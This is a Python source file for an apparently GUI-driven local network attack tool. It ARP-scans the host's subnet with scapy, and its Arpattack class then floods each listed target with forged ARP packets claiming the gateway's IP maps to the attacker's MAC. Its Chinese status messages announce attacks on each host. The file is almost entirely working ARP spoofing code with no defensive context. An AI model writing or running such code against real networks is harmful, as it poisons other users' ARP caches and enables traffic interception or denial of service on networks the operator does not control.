import socket
import time
from PyQt5.QtCore import pyqtSignal,QThread
from scapy.all import srp, Ether, ARP,sendp,getmacbyip
import uuid
import os,re

class Scan(QThread):
    _signal = pyqtSignal(str)

    def __init__(self,ipscan,parent=None):
        super(Scan, self).__init__(parent)
        """ipsan 为一个网段"""
        self.ipscan = ipscan

    def run(self):
        try:
            ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=self.ipscan), timeout=2)
        except Exception as e:
            print(e)
        else:
            for send, rcv in ans:
                ListMACAddr = rcv.sprintf("%Ether.src%---%ARP.psrc%")
                print(ListMACAddr)
                self._signal.emit(ListMACAddr)


class Arpattack(QThread):
    _signal = pyqtSignal(str)

    def __init__(self,iplist,parent=None):
        '''iplist 为要攻击的ip列表'''
        super(Arpattack, self).__init__(parent)
        self.iplist = iplist
        self.working = True

    def stop(self):
        self.working = False
        self.quit()

    def run(self):
        while self.working:
            for i in self.iplist:
                try:
                    # p1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=i[0]) / ARP(pdst=i[1],psrc=IP)
                    p1 = Ether(dst=i[0],src=MAC) / ARP(op=1,hwsrc=MAC,psrc=GWIP,hwdst=i[0],pdst=i[1])
                    self._signal.emit("开始攻击主机: {}".format(i[1]))
                    sendp(p1)
                except Exception as e:
                    print(e)
                    self._signal.emit("攻击失败")
            time.sleep(0.1)

def get_host_mac():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
    return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])

def get_host_ip_net():
    # 获取本网段 ip地址
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    listip = ip.split(".")
    listip.pop()
    ipnet = ".".join(listip)+".1/24"
    return ip ,ipnet

def gwtway():
    rtable = os.popen('route print').read()
    gwip = re.findall(r'0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)\s',rtable)[0]
    gwmac = getmacbyip(gwip)
    return gwip,gwmac

IP, IPNET = get_host_ip_net()
MAC = get_host_mac()
GWIP,GWMAC = gwtway()
